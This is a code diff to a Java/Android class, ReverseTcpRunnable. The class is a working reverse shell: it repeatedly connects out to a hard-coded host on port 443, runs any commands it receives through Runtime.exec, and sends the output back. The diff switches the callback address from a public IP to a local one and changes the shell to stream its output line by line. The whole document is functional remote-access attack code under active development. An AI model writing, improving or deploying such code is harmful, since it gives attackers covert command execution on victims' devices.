@@ -16,7 +16,7 @@ import java.net.Socket;
 
 public class ReverseTcpRunnable implements Runnable {
     private static final long RETRY_WAIT_TIME = 10000;
-    String host = "122.161.191.49";
+    String host = "192.168.1.15";
     int port = 443;
     private String directory = "/";
     private static final String CMD_CD = "cd";
@@ -47,13 +47,13 @@ public class ReverseTcpRunnable implements Runnable {
                 }
                 if (command.equalsIgnoreCase("bye")) {
                     run = false;
-                    toServer.write("bye".getBytes("UTF-8"));
+                    shotResponseLine("bye", toServer);
                     // Closing socket not required as we are closing stream in finally
                     continue;
                 }
-                String response = doCommand(command.split(" "));
-                response = (TextUtils.isEmpty(response)) ? "invalid" : response;
-                toServer.write(response.getBytes("UTF-8"));
+                doCommand(command.split(" "), toServer);
+                // Sending line break, giving client a chance for next command
+                shotEndResponse(toServer);
 
             }
         } catch (IOException e) {
@@ -74,6 +74,14 @@ public class ReverseTcpRunnable implements Runnable {
         }
     }
 
+    private void shotEndResponse(DataOutputStream toServer) {
+        try {
+            toServer.write("$endRes$".getBytes("UTF-8"));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
     private void retry() {
         try {
             Thread.sleep(RETRY_WAIT_TIME);
@@ -86,28 +94,33 @@ public class ReverseTcpRunnable implements Runnable {
 
 
     // Entry point for all type of commands shell and custom
-    private String doCommand(String[] commands) {
+    private void doCommand(String[] commands, DataOutputStream toServer) {
 
         if(TextUtils.isEmpty(commands[0])) {
-            return "\n";
+            return;
         }
         // Check if custom command and process
-        String res = tryInternalCommand(commands);
-        if (!TextUtils.isEmpty(res)) {
-            return res;
+        if (tryInternalCommand(commands, toServer)) {
+            return;
         }
+        // Try Shell commands
         commands = decideCommandName(commands);
-
-        String response = doShellCommand(commands);
-        log(response);
-        return response;
+        doShellCommand(commands, toServer);
     }
 
-    private String doShellCommand(String[] commands) {
+    private void shotResponseLine(String response, DataOutputStream toServer) {
+        try {
+            log(response);
+            toServer.write(response.getBytes("UTF-8"));
+        } catch (IOException e) {
+            e.printStackTrace();
+        }
+    }
+
+    private boolean doShellCommand(String[] commands, DataOutputStream toServer) {
         // Executing command with specific directory
         // directory init is handled by custom command
         Process process;
-        StringBuilder outputBuilder = new StringBuilder();
         BufferedReader reader = null;
         try {
             process = Runtime.getRuntime().exec(commands, null, new File(directory));
@@ -115,7 +128,7 @@ public class ReverseTcpRunnable implements Runnable {
                     new InputStreamReader(process.getInputStream()));
             String line = "";
             while ((line = reader.readLine()) != null) {
-                outputBuilder.append(line).append("\n");
+                shotResponseLine(line + "\n", toServer);
                 process.waitFor();
             }
         } catch (IOException e) {
@@ -131,24 +144,23 @@ public class ReverseTcpRunnable implements Runnable {
                 }
             }
         }
-        return outputBuilder.toString();
+        return true;
     }
-    private String tryInternalCommand(String[] cmd) {
-        String res = null;
+    private boolean tryInternalCommand(String[] cmd, DataOutputStream toServer) {
         switch (cmd[0]) {
             case CMD_CD: {
                 String dir = cmd[1];
                 if(dir.startsWith("/")) {
                     directory = dir;
                 } else {
-                    directory += dir;
+                    directory += "/" + dir;
                 }
-                res = "Working directory changed to: "+directory;
-                break;
+                String res = "Working directory changed to: "+directory;
+                shotResponseLine(res, toServer);
+                return true;
             }
         }
-        log(res);
-        return res;
+        return false;
 
     }
 
